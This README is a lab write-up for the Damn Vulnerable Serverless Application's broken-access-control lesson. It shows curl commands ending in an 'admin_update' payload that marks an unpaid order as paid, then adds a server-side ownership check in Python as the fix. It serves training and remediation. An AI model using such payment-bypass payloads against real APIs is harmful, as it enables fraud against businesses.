# DVSA Security Analysis: Broken Access Control (Lesson 5)

This repository contains a comprehensive security analysis and remediation guide for the **Damn Vulnerable Serverless Application (DVSA)**, specifically focusing on **Lesson 5: Broken Access Control**.

---

## ## Setup & Deployment
To deploy the DVSA environment for testing, follow these steps:

1.  **Prerequisites:** Ensure you have an AWS account and the [DVSA Source Code](https://github.com/m6000/dvsa).
2.  **Deployment:** * Deploy the infrastructure using the AWS CloudFormation console or the Serverless Framework (`sls deploy`).
    * Note the API Gateway endpoint URL (e.g., `https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order`).
3.  **Authentication:** Log in via the DVSA frontend to obtain a valid **Cognito ID Token (JWT)**. You will need this for the `Authorization` header in the following steps.

---

## ## Vulnerability Replication (Video 1)
Follow these steps to demonstrate the Broken Access Control flaw.

### 1. Initialize a New Order
First, create a standard order using your authenticated token.
```bash
curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
-H "Content-Type: application/json" \
-H "Authorization: <YOUR_TOKEN>" \
-d '{"action":"new", "cart-id":"your-cart-id", "items":{"1018":1}}'
```
* **Action:** Take note of the `order-id` returned in the response.

### 2. Update Shipping Information
Advance the order to the shipping stage.
```bash
curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
-H "Content-Type: application/json" \
-H "Authorization: <YOUR_TOKEN>" \
-d '{"action":"shipping", "order-id":"<YOUR_ORDER_ID>", "data":{"address":"Academic Belt Road", "email":"user@example.com", "name":"Student"}}'
```

### 3. Execute the Exploit (Bypass Payment)
Now, we bypass the payment gateway by directly calling the admin update function with a malicious payload to set the status to `paid`.
```bash
curl -X POST https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order \
-H "Content-Type: application/json" \
-H "Authorization: <YOUR_TOKEN>" \
-d '{"action":"admin_update", "order-id":"<YOUR_ORDER_ID>", "status":"paid"}'
```

**Evidence:** Upon listing your orders, you will see the status marked as **paid** despite never having interacted with a payment provider.

---

## ## Remediation & Patching (Video 2)
The root cause is the lack of server-side validation. The system trusts the payload without checking if the user owns the order or has admin privileges.

### 1. Technical Implementation
Modify the `order_access_control.py` (or the relevant Lambda file `DVSA-ADMIN-UPDATE-ORDERS`) to include a strict ownership check.

**Add the validation logic:**
We integrate a `can_access_order` check into the `update_item` path. This ensures that only the order owner (identified via the JWT) or a verified admin can modify the record.

```python
# Remediation Code for order_access_control.py

def update_item(order_id, user, obj, ts, is_admin):
    # 1. Retrieve the existing order from DynamoDB
    existing = get_order(order_id) 
    
    if not existing:
        return {"status": "err", "msg": "order not found"}  
    
    # 2. CRITICAL: Check if the requesting user is the owner or an admin
    if not can_access_order(existing, user, is_admin):
        return {"status": "err", "msg": "Unauthorized"}  

    # 3. Only proceed with the update if the check passes
    # ... update logic ...
```

### 2. Verification
1.  **Deploy** the updated Lambda function in the AWS Console.
2.  **Retry the Exploit:** Resend the curl command from Step 3 of the Replication guide.
3.  **Observation:** The API now returns `{"status": "err", "msg": "Unauthorized"}` or `{"status": "err", "msg": "unknown action"}`. The unauthorized modification is blocked.

---

## ## Security Best Practices
* **Server-Side Authorization:** Never trust the client to define permissions. Always verify identity and roles on the backend using trusted claims (e.g., Cognito JWT `sub` or `groups`).
* **Principle of Least Privilege:** Ensure that API endpoints are scoped correctly. Unprivileged users should not even be able to reach administrative code paths.
* **Avoid Sensitive Data in Payloads:** Don't let users submit fields like `status` or `is_admin` in requests that modify their own profiles or orders.

---
